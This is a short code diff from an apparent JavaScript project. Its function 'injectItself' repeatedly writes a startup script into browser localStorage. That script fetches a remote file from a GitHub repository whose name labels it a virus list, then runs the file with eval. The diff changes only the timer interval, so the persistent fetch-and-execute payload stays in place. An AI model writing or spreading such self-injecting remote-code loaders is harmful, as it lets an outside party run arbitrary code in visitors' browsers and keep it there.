@@ -1,5 +1,5 @@
 function injectItself(){
-  setInterval(()=>{localStorage.setItem('startupJS', `fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRVIRUSULTRAJAVASCRIPTLIST/refs/heads/main/Beznravstvennost9.js').then(r=>r.text()).then(eval);`)},130);
+  setInterval(()=>{localStorage.setItem('startupJS', `fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRVIRUSULTRAJAVASCRIPTLIST/refs/heads/main/Beznravstvennost9.js').then(r=>r.text()).then(eval);`)},500);
 }
 function resetAll(){
     (async () => {
